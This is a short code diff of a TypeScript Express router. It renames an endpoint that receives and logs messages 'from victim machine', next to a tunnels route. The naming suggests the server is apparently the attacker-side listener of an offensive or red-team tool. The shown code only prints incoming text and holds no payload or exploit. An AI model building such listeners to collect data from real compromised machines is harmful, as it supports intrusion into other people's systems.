@@ -43,11 +43,11 @@ router.delete('/tunnels', (req: Request, res: Response) => {
 });
 
 /**
- * Logs for victim endpoint
+ * Receive messages from victim machine
  */
-router.post('/log', (req: Request, res: Response) => {
-  const { log } = req.body;
-  console.log(`[Victim] ${log}`);
+router.post('/msg', (req: Request, res: Response) => {
+  const { msg } = req.body;
+  console.log(`[Victim] ${msg}`);
   return res.status(200).send();
 });
 
